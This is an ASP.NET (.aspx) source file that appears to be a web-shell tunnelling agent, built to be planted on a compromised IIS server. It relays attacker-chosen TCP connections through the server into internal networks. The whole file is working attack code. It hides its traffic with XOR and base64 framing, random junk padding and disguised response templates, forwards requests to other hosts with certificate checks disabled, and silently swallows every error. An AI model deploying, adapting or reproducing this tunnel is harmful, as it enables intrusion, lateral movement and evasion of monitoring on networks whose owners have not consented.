<%@ Page Language="C#" EnableSessionState="False" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Net.NetworkInformation" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Text" %><script runat="server">
    // Static variables
    static Hashtable addrs = CollectAddr();
    static Hashtable ctx = Hashtable.Synchronized(new Hashtable());

    const string CHARACTERS = "abcdefghijklmnopqrstuvwxyz0123456789";
    const int BUF_SIZE = 1024 * 16;

    // BlockingQueue implementation for .NET 2.0
    public class BlockingQueue<T>
    {
        private Queue<T> queue = new Queue<T>();
        private object lockObj = new object();

        public void Enqueue(T item)
        {
            lock (lockObj)
            {
                queue.Enqueue(item);
                Monitor.Pulse(lockObj);
            }
        }

        public T Dequeue(int timeoutMs)
        {
            lock (lockObj)
            {
                DateTime endTime = DateTime.Now.AddMilliseconds(timeoutMs);
                while (queue.Count == 0)
                {
                    int remaining = (int)(endTime - DateTime.Now).TotalMilliseconds;
                    if (remaining <= 0 || !Monitor.Wait(lockObj, remaining))
                    {
                        return default(T);
                    }
                }
                return queue.Dequeue();
            }
        }

        public T Poll()
        {
            lock (lockObj)
            {
                if (queue.Count == 0)
                {
                    return default(T);
                }
                return queue.Dequeue();
            }
        }

        public void Clear()
        {
            lock (lockObj)
            {
                queue.Clear();
            }
        }

        public int Count
        {
            get
            {
                lock (lockObj)
                {
                    return queue.Count;
                }
            }
        }
    }

    // Utility functions
    private string RandomString(int length)
    {
        if (length <= 0) return "";
        Random random = new Random();
        char[] randomChars = new char[length];
        for (int i = 0; i < length; i++)
        {
            int randomIndex = random.Next(CHARACTERS.Length);
            randomChars[i] = CHARACTERS[randomIndex];
        }
        return new string(randomChars);
    }

    private byte[] U32ToBytes(int i)
    {
        byte[] result = new byte[4];
        result[0] = (byte)(i >> 24);
        result[1] = (byte)(i >> 16);
        result[2] = (byte)(i >> 8);
        result[3] = (byte)(i);
        return result;
    }

    private int BytesToU32(byte[] bytes)
    {
        return ((bytes[0] & 0xFF) << 24) |
               ((bytes[1] & 0xFF) << 16) |
               ((bytes[2] & 0xFF) << 8) |
               ((bytes[3] & 0xFF) << 0);
    }

    private byte[] CopyOfRange(byte[] original, int from, int to)
    {
        int newLength = to - from;
        if (newLength < 0)
        {
            throw new ArgumentException(from + " > " + to);
        }
        byte[] copy = new byte[newLength];
        int copyLength = Math.Min(original.Length - from, newLength);
        for (int i = 0; i < copyLength; i++)
        {
            copy[i] = original[from + i];
        }
        return copy;
    }

    private void ReadFull(Stream stream, byte[] buffer)
    {
        int offset = 0;
        while (offset < buffer.Length)
        {
            int readLength = buffer.Length - offset;
            int readResult = stream.Read(buffer, offset, readLength);
            if (readResult <= 0)
            {
                throw new IOException("stream EOF");
            }
            offset += readResult;
        }
    }

    private byte[] ToByteArray(Stream stream)
    {
        try
        {
            MemoryStream ms = new MemoryStream();
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
            {
                ms.Write(buffer, 0, bytesRead);
            }
            return ms.ToArray();
        }
        catch (IOException)
        {
            return new byte[0];
        }
    }

    // Base64 URL encoding/decoding
    private string Base64UrlEncode(byte[] data)
    {
        string base64 = Convert.ToBase64String(data);
        string urlSafe = base64.Replace('+', '-').Replace('/', '_');
        while (urlSafe.EndsWith("="))
        {
            urlSafe = urlSafe.Substring(0, urlSafe.Length - 1);
        }
        return urlSafe;
    }

    private byte[] Base64UrlDecode(string data)
    {
        if (data == null) return null;
        string base64 = data.Replace('-', '+').Replace('_', '/');
        while (base64.Length % 4 != 0)
        {
            base64 += "=";
        }
        return Convert.FromBase64String(base64);
    }

    // Protocol marshal/unmarshal with base64 and XOR
    private byte[] MarshalBase64(Dictionary<string, byte[]> m)
    {
        // Add random junk data
        Random random = new Random();
        int junkSize = random.Next(32);
        if (junkSize > 0)
        {
            byte[] junk = new byte[junkSize];
            random.NextBytes(junk);
            m["_"] = junk;
        }

        MemoryStream buf = new MemoryStream();
        foreach (KeyValuePair<string, byte[]> kvp in m)
        {
            string key = kvp.Key;
            byte[] value = kvp.Value;
            buf.WriteByte((byte)key.Length);
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);
            buf.Write(keyBytes, 0, keyBytes.Length);
            byte[] vLen = U32ToBytes(value.Length);
            buf.Write(vLen, 0, vLen.Length);
            buf.Write(value, 0, value.Length);
        }

        // Generate XOR key (2 bytes)
        byte[] xorKey = new byte[2];
        xorKey[0] = (byte)(random.Next(255) + 1);
        xorKey[1] = (byte)(random.Next(255) + 1);

        byte[] data = buf.ToArray();
        for (int i = 0; i < data.Length; i++)
        {
            data[i] = (byte)(data[i] ^ xorKey[i % 2]);
        }

        string base64Data = Base64UrlEncode(data);
        byte[] base64Bytes = Encoding.UTF8.GetBytes(base64Data);

        // Create header: [2 bytes XOR key][4 bytes data length (XOR encrypted)]
        MemoryStream headerBuf = new MemoryStream();
        headerBuf.Write(xorKey, 0, 2);
        byte[] lenBytes = U32ToBytes(base64Bytes.Length);
        for (int i = 0; i < 4; i++)
        {
            lenBytes[i] = (byte)(lenBytes[i] ^ xorKey[i % 2]);
        }
        headerBuf.Write(lenBytes, 0, 4);

        byte[] header = headerBuf.ToArray();
        string base64Header = Base64UrlEncode(header);
        byte[] base64HeaderBytes = Encoding.UTF8.GetBytes(base64Header);

        // Combine header + data
        MemoryStream result = new MemoryStream();
        result.Write(base64HeaderBytes, 0, base64HeaderBytes.Length);
        result.Write(base64Bytes, 0, base64Bytes.Length);

        return result.ToArray();
    }

    private Dictionary<string, byte[]> UnmarshalBase64(Stream stream)
    {
        Dictionary<string, byte[]> m = new Dictionary<string, byte[]>();

        byte[] headerBytes = new byte[8];
        ReadFull(stream, headerBytes);

        byte[] header = Base64UrlDecode(Encoding.UTF8.GetString(headerBytes));
        if (header == null || header.Length == 0)
        {
            return m;
        }

        byte[] xorKey = new byte[] { header[0], header[1] };
        for (int i = 2; i < 6; i++)
        {
            header[i] = (byte)(header[i] ^ xorKey[i % 2]);
        }

        int dataLen = BytesToU32(CopyOfRange(header, 2, 6));
        if (dataLen > 1024 * 1024 * 32)
        {
            throw new IOException("invalid len");
        }

        byte[] base64Data = new byte[dataLen];
        ReadFull(stream, base64Data);

        byte[] data = Base64UrlDecode(Encoding.UTF8.GetString(base64Data));
        for (int i = 0; i < data.Length; i++)
        {
            data[i] = (byte)(data[i] ^ xorKey[i % 2]);
        }

        // Parse key-value pairs
        for (int i = 0; i < data.Length; )
        {
            int keyLen = data[i] & 0xFF;
            i += 1;
            if (i + keyLen > data.Length)
            {
                throw new Exception("key len error");
            }

            string key = Encoding.UTF8.GetString(CopyOfRange(data, i, i + keyLen));
            i += keyLen;

            if (i + 4 > data.Length)
            {
                throw new Exception("value len error");
            }

            int valueLen = BytesToU32(CopyOfRange(data, i, i + 4));
            i += 4;
            if (valueLen < 0 || i + valueLen > data.Length)
            {
                throw new Exception("value error");
            }

            byte[] value = CopyOfRange(data, i, i + valueLen);
            i += valueLen;

            m[key] = value;
        }

        return m;
    }

    // Helper functions to create protocol messages
    private Dictionary<string, byte[]> NewData(string tunId, byte[] data)
    {
        Dictionary<string, byte[]> m = new Dictionary<string, byte[]>();
        m["ac"] = new byte[] { 0x01 };
        m["dt"] = data;
        m["id"] = Encoding.UTF8.GetBytes(tunId);
        return m;
    }

    private Dictionary<string, byte[]> NewDel(string tunId)
    {
        Dictionary<string, byte[]> m = new Dictionary<string, byte[]>();
        m["ac"] = new byte[] { 0x02 };
        m["id"] = Encoding.UTF8.GetBytes(tunId);
        return m;
    }

    private Dictionary<string, byte[]> NewStatus(string tunId, byte status)
    {
        Dictionary<string, byte[]> m = new Dictionary<string, byte[]>();
        m["ac"] = new byte[] { 0x03 };
        m["s"] = new byte[] { status };
        m["id"] = Encoding.UTF8.GetBytes(tunId);
        return m;
    }

    private Dictionary<string, byte[]> NewHeartbeat(string tunId)
    {
        Dictionary<string, byte[]> m = new Dictionary<string, byte[]>();
        m["ac"] = new byte[] { 0x10 };
        m["id"] = Encoding.UTF8.GetBytes(tunId);
        return m;
    }

    private Dictionary<string, byte[]> NewDirtyChunk(int size)
    {
        Dictionary<string, byte[]> m = new Dictionary<string, byte[]>();
        m["ac"] = new byte[] { 0x11 };
        if (size > 0)
        {
            byte[] data = new byte[size];
            new Random().NextBytes(data);
            m["d"] = data;
        }
        return m;
    }

    // Context management
    private void PutKey(string key, object value)
    {
        ctx[key] = value;
    }

    private object GetKey(string key)
    {
        return ctx[key];
    }

    private void RemoveKey(string key)
    {
        ctx.Remove(key);
    }

    // Template handling
    private byte[] ProcessTemplateStart(string sid)
    {
        object o = GetKey(sid);
        if (o == null) return new byte[0];

        string[] tplParts = (string[])o;
        if (tplParts.Length != 3) return new byte[0];

        Response.ContentType = tplParts[0];
        return Encoding.UTF8.GetBytes(tplParts[1]);
    }

    private byte[] ProcessTemplateEnd(string sid)
    {
        object o = GetKey(sid);
        if (o == null) return new byte[0];

        string[] tplParts = (string[])o;
        if (tplParts.Length != 3) return new byte[0];

        return Encoding.UTF8.GetBytes(tplParts[2]);
    }

    private int GetDirtySize(string sid)
    {
        object o = GetKey(sid + "_jk");
        if (o == null) return 0;
        return (int)o;
    }

    private void WriteAndFlush(byte[] data, int dirtySize)
    {
        if (data == null || data.Length == 0) return;

        Response.OutputStream.Write(data, 0, data.Length);
        if (dirtySize != 0)
        {
            byte[] dirtyData = MarshalBase64(NewDirtyChunk(dirtySize));
            Response.OutputStream.Write(dirtyData, 0, dirtyData.Length);
        }
        Response.OutputStream.Flush();
        Response.Flush();
    }

    // Network address collection
    private static Hashtable CollectAddr()
    {
        Hashtable addrs = new Hashtable();
        try
        {
            NetworkInterface[] nifs = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface nif in nifs)
            {
                IPInterfaceProperties ipProps = nif.GetIPProperties();
                foreach (IPAddressInformation addrInfo in ipProps.UnicastAddresses)
                {
                    string s = addrInfo.Address.ToString();
                    if (s != null)
                    {
                        int idx = s.IndexOf('%');
                        if (idx > 0)
                        {
                            s = s.Substring(0, idx);
                        }
                        addrs[s] = true;
                    }
                }
            }
        }
        catch (Exception)
        {
        }
        return Hashtable.Synchronized(addrs);
    }

    private bool IsLocalAddr(string url)
    {
        try
        {
            Uri uri = new Uri(url);
            return addrs.ContainsKey(uri.Host);
        }
        catch (Exception)
        {
            return false;
        }
    }

    // Redirect function
    private bool ProcessRedirect(Dictionary<string, byte[]> dataMap, byte[] bodyPrefix, byte[] bodyContent)
    {
        byte[] redirectData;
        bool needRedirect = dataMap.TryGetValue("r", out redirectData) && redirectData != null && redirectData.Length > 0;

        if (needRedirect && !IsLocalAddr(Encoding.UTF8.GetString(redirectData)))
        {
            HttpWebRequest conn = null;
            try
            {
                MemoryStream ms = new MemoryStream();
                ms.Write(bodyPrefix, 0, bodyPrefix.Length);
                byte[] marshaledData = MarshalBase64(dataMap);
                ms.Write(marshaledData, 0, marshaledData.Length);
                ms.Write(bodyContent, 0, bodyContent.Length);
                byte[] newBody = ms.ToArray();

                string redirectUrl = Encoding.UTF8.GetString(redirectData);
                conn = (HttpWebRequest)WebRequest.Create(redirectUrl);
                conn.Method = Request.HttpMethod;
                conn.Timeout = 3000;
                conn.ReadWriteTimeout = System.Threading.Timeout.Infinite;

                // Ignore SSL verify
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

                // Copy headers
                foreach (string key in Request.Headers.AllKeys)
                {
                    string value = Request.Headers[key];
                    switch (key)
                    {
                        case "Accept":
                            conn.Accept = value;
                            break;
                        case "Connection":
                            break;
                        case "Content-Type":
                            conn.ContentType = value;
                            break;
                        case "Content-Length":
                            break;
                        case "Expect":
                            conn.Expect = value;
                            break;
                        case "Referer":
                            conn.Referer = value;
                            break;
                        case "User-Agent":
                            conn.UserAgent = value;
                            break;
                        default:
                            if (!WebHeaderCollection.IsRestricted(key, false))
                            {
                                conn.Headers.Add(key, value);
                            }
                            break;
                    }
                }

                Stream requestStream = conn.GetRequestStream();
                requestStream.Write(newBody, 0, newBody.Length);
                requestStream.Close();

                HttpWebResponse resp = (HttpWebResponse)conn.GetResponse();
                Stream responseStream = resp.GetResponseStream();

                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = responseStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    Response.OutputStream.Write(buffer, 0, bytesRead);
                }

                responseStream.Close();
                resp.Close();

                return true;
            }
            catch (Exception)
            {
            }
            finally
            {
                if (conn != null)
                {
                    // HttpWebRequest doesn't have disconnect
                }
            }
        }

        return false;
    }

    // Handshake processing
    private void ProcessHandshake(Dictionary<string, byte[]> dataMap, string tunId, string sid)
    {
        byte[] redirectData;
        bool needRedirect = dataMap.TryGetValue("r", out redirectData) && redirectData != null && redirectData.Length > 0;
        if (needRedirect && !IsLocalAddr(Encoding.UTF8.GetString(redirectData)))
        {
            return;
        }

        // Parse template
        byte[] tplData;
        byte[] contentTypeData;
        if (dataMap.TryGetValue("tpl", out tplData) && tplData != null && tplData.Length > 0 &&
            dataMap.TryGetValue("ct", out contentTypeData) && contentTypeData != null && contentTypeData.Length > 0)
        {
            string tpl = Encoding.UTF8.GetString(tplData);
            string[] parts = tpl.Split(new string[] { "#data#" }, 2, StringSplitOptions.None);
            if (parts.Length == 2)
            {
                PutKey(sid, new string[] { Encoding.UTF8.GetString(contentTypeData), parts[0], parts[1] });
            }
            else
            {
                PutKey(sid, new string[0]);
            }
        }
        else
        {
            PutKey(sid, new string[0]);
        }

        // Parse dirty size
        byte[] dirtySizeData;
        if (dataMap.TryGetValue("jk", out dirtySizeData) && dirtySizeData != null && dirtySizeData.Length > 0)
        {
            try
            {
                int dirtySize = int.Parse(Encoding.UTF8.GetString(dirtySizeData));
                if (dirtySize < 0) dirtySize = 0;
                PutKey(sid + "_jk", dirtySize);
            }
            catch (Exception)
            {
            }
        }

        // Check auto mode
        byte[] isAutoData;
        bool isAuto = dataMap.TryGetValue("a", out isAutoData) && isAutoData != null && isAutoData.Length > 0 && isAutoData[0] == 0x01;

        if (isAuto)
        {
            // Streaming response
            Response.Buffer = false;
            Response.ContentType = "application/octet-stream";
            Response.AddHeader("X-Accel-Buffering", "no");

            byte[] prefix = ProcessTemplateStart(sid);
            if (prefix.Length > 0)
            {
                Response.OutputStream.Write(prefix, 0, prefix.Length);
            }

            byte[] dt;
            if (dataMap.TryGetValue("dt", out dt))
            {
                byte[] data1 = MarshalBase64(NewData(tunId, dt));
                Response.OutputStream.Write(data1, 0, data1.Length);
            }

            Response.Flush();
            Thread.Sleep(2000);

            byte[] data2 = MarshalBase64(NewData(tunId, Encoding.UTF8.GetBytes(sid)));
            Response.OutputStream.Write(data2, 0, data2.Length);

            byte[] suffix = ProcessTemplateEnd(sid);
            if (suffix.Length > 0)
            {
                Response.OutputStream.Write(suffix, 0, suffix.Length);
            }

            Response.Flush();
        }
        else
        {
            // Buffered response
            MemoryStream ms = new MemoryStream();

            byte[] prefix = ProcessTemplateStart(sid);
            ms.Write(prefix, 0, prefix.Length);

            byte[] dt;
            if (dataMap.TryGetValue("dt", out dt))
            {
                byte[] data1 = MarshalBase64(NewData(tunId, dt));
                ms.Write(data1, 0, data1.Length);
            }

            byte[] data2 = MarshalBase64(NewData(tunId, Encoding.UTF8.GetBytes(sid)));
            ms.Write(data2, 0, data2.Length);

            byte[] suffix = ProcessTemplateEnd(sid);
            ms.Write(suffix, 0, suffix.Length);

            byte[] result = ms.ToArray();
            Response.OutputStream.Write(result, 0, result.Length);
        }
    }

    // Socket operations for Half mode
    private byte[] ReadSocket(Socket socket)
    {
        byte[] buffer = new byte[BUF_SIZE];
        int bytesRead = socket.Receive(buffer);
        if (bytesRead <= 0)
        {
            return new byte[0];
        }
        byte[] data = new byte[bytesRead];
        Array.Copy(buffer, data, bytesRead);
        return data;
    }

    // Half mode processing
    private void ProcessHalfStream(Dictionary<string, byte[]> dataMap, string tunId, int dirtySize)
    {
        bool sendClose = true;

        try
        {
            byte action = dataMap["ac"][0];
            switch (action)
            {
                case 0x00: // Create
                    byte[] createData = PerformCreate(dataMap, tunId, false);
                    WriteAndFlush(createData, dirtySize);

                    object[] objs = (object[])GetKey(tunId);
                    if (objs == null)
                    {
                        throw new IOException("tunnel not found");
                    }

                    Socket socket = (Socket)objs[0];
                    while (true)
                    {
                        try
                        {
                            byte[] data = ReadSocket(socket);
                            if (data.Length == 0)
                            {
                                break;
                            }
                            WriteAndFlush(MarshalBase64(NewData(tunId, data)), dirtySize);
                        }
                        catch (Exception)
                        {
                            break;
                        }
                    }
                    break;

                case 0x01: // Write
                    PerformWrite(dataMap, tunId, false);
                    break;

                case 0x02: // Delete
                    sendClose = false;
                    PerformDelete(tunId);
                    break;

                case 0x10: // Heartbeat
                    WriteAndFlush(MarshalBase64(NewHeartbeat(tunId)), dirtySize);
                    break;
            }
        }
        catch (Exception)
        {
            PerformDelete(tunId);
            if (sendClose)
            {
                WriteAndFlush(MarshalBase64(NewDel(tunId)), dirtySize);
            }
        }
    }

    // Classic mode processing
    private void ProcessClassic(MemoryStream respBodyStream, Dictionary<string, byte[]> dataMap, string tunId)
    {
        bool sendClose = true;

        try
        {
            byte action = dataMap["ac"][0];
            switch (action)
            {
                case 0x00: // Create
                    byte[] createData = PerformCreate(dataMap, tunId, true);
                    respBodyStream.Write(createData, 0, createData.Length);
                    break;

                case 0x01: // Write
                    PerformWrite(dataMap, tunId, true);
                    byte[] readData = PerformRead(tunId);
                    respBodyStream.Write(readData, 0, readData.Length);
                    break;

                case 0x02: // Delete
                    sendClose = false;
                    PerformDelete(tunId);
                    break;
            }
        }
        catch (Exception)
        {
            PerformDelete(tunId);
            if (sendClose)
            {
                byte[] delData = MarshalBase64(NewDel(tunId));
                respBodyStream.Write(delData, 0, delData.Length);
            }
        }
    }

    // Perform create connection
    private byte[] PerformCreate(Dictionary<string, byte[]> dataMap, string tunId, bool newThread)
    {
        string host = Encoding.UTF8.GetString(dataMap["h"]);
        int port = int.Parse(Encoding.UTF8.GetString(dataMap["p"]));
        if (port == 0)
        {
            string portStr = Request.ServerVariables["SERVER_PORT"];
            if (string.IsNullOrEmpty(portStr)) portStr = "80";
            port = int.Parse(portStr);
        }

        MemoryStream ms = new MemoryStream();
        Socket socket = null;
        Dictionary<string, byte[]> resultData = null;

        try
        {
            IPAddress ip;
            try
            {
                ip = IPAddress.Parse(host);
            }
            catch (Exception)
            {
                IPHostEntry hostInfo = Dns.GetHostEntry(host);
                if (hostInfo.AddressList.Length == 0)
                {
                    throw new Exception("Cannot resolve host");
                }
                ip = hostInfo.AddressList[0];
            }

            socket = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            socket.NoDelay = true;
            socket.ReceiveBufferSize = 128 * 1024;
            socket.SendBufferSize = 128 * 1024;

            IAsyncResult result = socket.BeginConnect(ip, port, null, null);
            bool success = result.AsyncWaitHandle.WaitOne(3000, true);

            if (!success)
            {
                throw new Exception("Connection timeout");
            }

            socket.EndConnect(result);

            resultData = NewStatus(tunId, 0x00);

            if (newThread)
            {
                BlockingQueue<byte[]> readQueue = new BlockingQueue<byte[]>();
                BlockingQueue<byte[]> writeQueue = new BlockingQueue<byte[]>();
                PutKey(tunId, new object[] { socket, readQueue, writeQueue });

                // Start read thread
                ThreadPool.QueueUserWorkItem(delegate
                {
                    RunReadThread(tunId, socket, readQueue);
                });

                // Start write thread
                ThreadPool.QueueUserWorkItem(delegate
                {
                    RunWriteThread(tunId, socket, writeQueue);
                });
            }
            else
            {
                PutKey(tunId, new object[] { socket, null, null });
            }
        }
        catch (Exception)
        {
            if (socket != null)
            {
                try
                {
                    socket.Close();
                }
                catch (Exception)
                {
                }
            }
            resultData = NewStatus(tunId, 0x01);
        }

        byte[] data = MarshalBase64(resultData);
        ms.Write(data, 0, data.Length);
        return ms.ToArray();
    }

    // Perform write to socket
    private void PerformWrite(Dictionary<string, byte[]> dataMap, string tunId, bool newThread)
    {
        object[] objs = (object[])GetKey(tunId);
        if (objs == null)
        {
            throw new IOException("tunnel not found");
        }

        Socket socket = (Socket)objs[0];
        if (!socket.Connected)
        {
            throw new IOException("socket not connected");
        }

        byte[] data = dataMap["dt"];
        if (data.Length != 0)
        {
            if (newThread)
            {
                BlockingQueue<byte[]> writeQueue = (BlockingQueue<byte[]>)objs[2];
                writeQueue.Enqueue(data);
            }
            else
            {
                socket.Send(data);
            }
        }
    }

    // Perform read from socket (Classic mode)
    private byte[] PerformRead(string tunId)
    {
        object[] objs = (object[])GetKey(tunId);
        if (objs == null)
        {
            throw new IOException("tunnel not found");
        }

        Socket socket = (Socket)objs[0];
        if (!socket.Connected)
        {
            throw new IOException("socket not connected");
        }

        MemoryStream ms = new MemoryStream();
        BlockingQueue<byte[]> readQueue = (BlockingQueue<byte[]>)objs[1];

        int maxSize = 512 * 1024;
        int written = 0;

        while (true)
        {
            byte[] data = readQueue.Poll();
            if (data != null)
            {
                written += data.Length;
                byte[] marshaledData = MarshalBase64(NewData(tunId, data));
                ms.Write(marshaledData, 0, marshaledData.Length);
                if (written >= maxSize)
                {
                    break;
                }
            }
            else
            {
                break;
            }
        }

        return ms.ToArray();
    }

    // Perform delete connection
    private void PerformDelete(string tunId)
    {
        object[] objs = (object[])GetKey(tunId);
        if (objs != null)
        {
            RemoveKey(tunId);
            Socket socket = (Socket)objs[0];
            BlockingQueue<byte[]> writeQueue = (BlockingQueue<byte[]>)objs[2];

            try
            {
                if (writeQueue != null)
                {
                    // Trigger write thread to exit
                    writeQueue.Enqueue(new byte[0]);
                }
                socket.Close();
            }
            catch (Exception)
            {
            }
        }
    }

    // Background thread for reading from socket
    private void RunReadThread(string tunId, Socket socket, BlockingQueue<byte[]> readQueue)
    {
        bool selfClean = false;
        try
        {
            byte[] buffer = new byte[BUF_SIZE];
            while (true)
            {
                int bytesRead = socket.Receive(buffer);
                if (bytesRead <= 0)
                {
                    break;
                }

                byte[] data = new byte[bytesRead];
                Array.Copy(buffer, data, bytesRead);

                readQueue.Enqueue(data);

                // Check timeout (60 seconds)
                if (readQueue.Count > 1000)
                {
                    selfClean = true;
                    break;
                }
            }
        }
        catch (Exception)
        {
        }
        finally
        {
            if (selfClean)
            {
                RemoveKey(tunId);
            }
            readQueue.Clear();
            try
            {
                socket.Close();
            }
            catch (Exception)
            {
            }
        }
    }

    // Background thread for writing to socket
    private void RunWriteThread(string tunId, Socket socket, BlockingQueue<byte[]> writeQueue)
    {
        bool selfClean = false;
        try
        {
            while (true)
            {
                byte[] data = writeQueue.Dequeue(300000); // 300 seconds timeout
                if (data == null || data.Length == 0)
                {
                    selfClean = true;
                    break;
                }

                socket.Send(data);
            }
        }
        catch (Exception)
        {
        }
        finally
        {
            if (selfClean)
            {
                RemoveKey(tunId);
            }
            writeQueue.Clear();
            try
            {
                writeQueue.Enqueue(new byte[0]);
                socket.Close();
            }
            catch (Exception)
            {
            }
        }
    }

    // Main processing function
    private void Process()
    {
        string sid = null;
        byte[] bodyPrefix = new byte[0];

        try
        {
            Stream reqInputStream = Request.InputStream;
            Dictionary<string, byte[]> dataMap = UnmarshalBase64(reqInputStream);

            byte[] modeData;
            byte[] actionData;
            byte[] tunIdData;
            byte[] sidData;

            if (!dataMap.TryGetValue("m", out modeData) || modeData == null || modeData.Length == 0)
            {
                return;
            }
            if (!dataMap.TryGetValue("ac", out actionData) || actionData == null || actionData.Length != 1)
            {
                return;
            }
            if (!dataMap.TryGetValue("id", out tunIdData) || tunIdData == null || tunIdData.Length == 0)
            {
                return;
            }

            dataMap.TryGetValue("sid", out sidData);
            if (sidData != null && sidData.Length > 0)
            {
                sid = Encoding.UTF8.GetString(sidData);
            }

            string tunId = Encoding.UTF8.GetString(tunIdData);
            byte mode = modeData[0];

            switch (mode)
            {
                case 0x00: // Handshake
                    sid = RandomString(16);
                    ProcessHandshake(dataMap, tunId, sid);
                    break;

                case 0x02: // Half mode
                    Response.Buffer = false;
                    Response.ContentType = "application/octet-stream";
                    Response.AddHeader("X-Accel-Buffering", "no");

                    goto case 0x03;

                case 0x03: // Classic mode
                    byte[] bodyContent = ToByteArray(reqInputStream);

                    if (ProcessRedirect(dataMap, bodyPrefix, bodyContent))
                    {
                        break;
                    }

                    if (sidData == null || sidData.Length == 0 || GetKey(Encoding.UTF8.GetString(sidData)) == null)
                    {
                        Response.StatusCode = 403;
                        return;
                    }

                    MemoryStream bodyStream = new MemoryStream(bodyContent);
                    int dirtySize = GetDirtySize(sid);

                    if (mode == 0x02)
                    {
                        // Half mode
                        WriteAndFlush(ProcessTemplateStart(sid), dirtySize);

                        do
                        {
                            ProcessHalfStream(dataMap, tunId, dirtySize);
                            try
                            {
                                dataMap = UnmarshalBase64(bodyStream);
                                if (dataMap.Count == 0)
                                {
                                    break;
                                }
                                tunId = Encoding.UTF8.GetString(dataMap["id"]);
                            }
                            catch (Exception)
                            {
                                break;
                            }
                        } while (true);

                        WriteAndFlush(ProcessTemplateEnd(sid), dirtySize);
                    }
                    else
                    {
                        // Classic mode
                        MemoryStream baos = new MemoryStream();
                        byte[] templateStart = ProcessTemplateStart(sid);
                        baos.Write(templateStart, 0, templateStart.Length);

                        do
                        {
                            ProcessClassic(baos, dataMap, tunId);
                            try
                            {
                                dataMap = UnmarshalBase64(bodyStream);
                                if (dataMap.Count == 0)
                                {
                                    break;
                                }
                                tunId = Encoding.UTF8.GetString(dataMap["id"]);
                            }
                            catch (Exception)
                            {
                                break;
                            }
                        } while (true);

                        byte[] templateEnd = ProcessTemplateEnd(sid);
                        baos.Write(templateEnd, 0, templateEnd.Length);

                        byte[] responseData = baos.ToArray();
                        Response.AppendHeader("Content-Length", responseData.Length.ToString());
                        Response.OutputStream.Write(responseData, 0, responseData.Length);
                    }

                    break;
            }
        }
        catch (Exception)
        {
        }
    }
</script><%
    // Initialize thread pool on first request
    if (!ctx.ContainsKey("init"))
    {
        ctx["init"] = true;
        const int workers = 256;
        int workerThreads, completionPortThreads;
        ThreadPool.GetMaxThreads(out workerThreads, out completionPortThreads);
        if (workerThreads < workers) workerThreads += workers;
        if (completionPortThreads < workers) completionPortThreads += workers;
        ThreadPool.SetMaxThreads(workerThreads, completionPortThreads);

        ThreadPool.GetMinThreads(out workerThreads, out completionPortThreads);
        if (workerThreads < workers) workerThreads = workers;
        if (completionPortThreads < workers) completionPortThreads = workers;
        ThreadPool.SetMinThreads(workerThreads, completionPortThreads);
    }

    Server.ScriptTimeout = int.MaxValue;


    try
    {
        Process();
    }
    catch (Exception)
    {
    }
%>